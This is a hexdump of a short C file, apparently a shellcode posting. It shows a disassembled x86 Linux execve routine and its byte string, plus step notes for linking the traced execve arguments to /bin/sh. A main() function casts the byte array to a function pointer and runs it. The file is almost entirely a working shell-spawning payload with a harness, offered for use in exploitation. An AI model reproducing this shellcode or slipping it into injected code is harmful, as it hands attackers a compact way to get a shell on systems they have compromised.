00000000  2f 2a 0d 0a 30 38 30 34  38 33 33 34 20 3c 6d 61  |/*..08048334 <ma|
00000010  69 6e 3e 3a 0d 0a 20 38  30 34 38 33 33 34 3a 20  |in>:.. 8048334: |
00000020  20 20 39 39 20 20 20 20  20 20 20 20 20 20 20 20  |  99            |
00000030  20 20 20 20 20 20 20 20  20 20 63 6c 74 64 0d 0a  |          cltd..|
00000040  20 38 30 34 38 33 33 35  3a 20 20 20 36 61 20 30  | 8048335:   6a 0|
00000050  62 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |b               |
00000060  20 20 20 20 70 75 73 68  20 20 20 24 30 78 62 0d  |    push   $0xb.|
00000070  0a 20 38 30 34 38 33 33  37 3a 20 20 20 35 38 20  |. 8048337:   58 |
00000080  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000090  20 20 20 20 20 70 6f 70  20 20 20 20 25 65 61 78  |     pop    %eax|
000000a0  0d 0a 20 38 30 34 38 33  33 38 3a 20 20 20 36 30  |.. 8048338:   60|
000000b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000c0  20 20 20 20 20 20 70 75  73 68 61 0d 0a 20 38 30  |      pusha.. 80|
000000d0  34 38 33 33 39 3a 20 20  20 35 39 20 20 20 20 20  |48339:   59     |
000000e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000f0  20 70 6f 70 20 20 20 20  25 65 63 78 0d 0a 20 38  | pop    %ecx.. 8|
00000100  30 34 38 33 33 61 3a 20  20 20 63 64 20 38 30 20  |04833a:   cd 80 |
00000110  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000120  20 20 69 6e 74 20 20 20  20 24 30 78 38 30 0d 0a  |  int    $0x80..|
00000130  20 0d 0a 75 73 69 6e 67  20 74 68 69 73 20 63 6f  | ..using this co|
00000140  64 65 2e 0d 0a 20 0d 0a  73 74 65 70 31 2e 20 54  |de... ..step1. T|
00000150  68 69 73 20 63 6f 64 65  20 69 73 20 63 6f 6d 70  |his code is comp|
00000160  69 6c 65 64 2e 0d 0a 73  74 65 70 32 2e 20 73 74  |iled...step2. st|
00000170  72 61 63 65 20 2d 78 20  6f 75 74 70 75 74 20 62  |race -x output b|
00000180  69 6e 61 72 79 0d 0a 73  74 65 70 33 2e 20 67 65  |inary..step3. ge|
00000190  74 20 65 78 65 63 76 65  20 61 72 67 73 20 69 6e  |t execve args in|
000001a0  20 73 74 72 61 63 65 20  72 65 73 75 6c 74 2e 0d  | strace result..|
000001b0  0a 73 74 65 70 34 2e 20  63 72 65 61 74 65 20 6c  |.step4. create l|
000001c0  69 6e 6b 20 65 78 65 63  76 65 20 61 72 67 73 20  |ink execve args |
000001d0  6f 6e 20 2f 62 69 6e 2f  73 68 0d 0a 20 0d 0a 2a  |on /bin/sh.. ..*|
000001e0  2f 0d 0a 20 0d 0a 75 6e  73 69 67 6e 65 64 20 63  |/.. ..unsigned c|
000001f0  68 61 72 20 73 63 5b 5d  3d 0d 0a 22 5c 78 39 39  |har sc[]=.."\x99|
00000200  5c 78 36 61 5c 78 30 62  5c 78 35 38 5c 78 36 30  |\x6a\x0b\x58\x60|
00000210  5c 78 35 39 5c 78 63 64  5c 78 38 30 22 3b 0d 0a  |\x59\xcd\x80";..|
00000220  69 6e 74 20 6d 61 69 6e  28 29 0d 0a 7b 0d 0a 20  |int main()..{.. |
00000230  20 20 20 76 6f 69 64 20  28 2a 70 29 28 29 3b 0d  |   void (*p)();.|
00000240  0a 20 20 20 20 70 20 3d  20 73 63 3b 0d 0a 20 20  |.    p = sc;..  |
00000250  20 20 70 28 29 3b 0d 0a  7d 0d 0a 20 0d 0a 68 61  |  p();..}.. ..ha|
00000260  76 65 20 61 20 6e 69 63  65 20 64 61 79 7e 0d 0a  |ve a nice day~..|
00000270  20 0d 0a 74 68 78 7e                              | ..thx~|
00000277
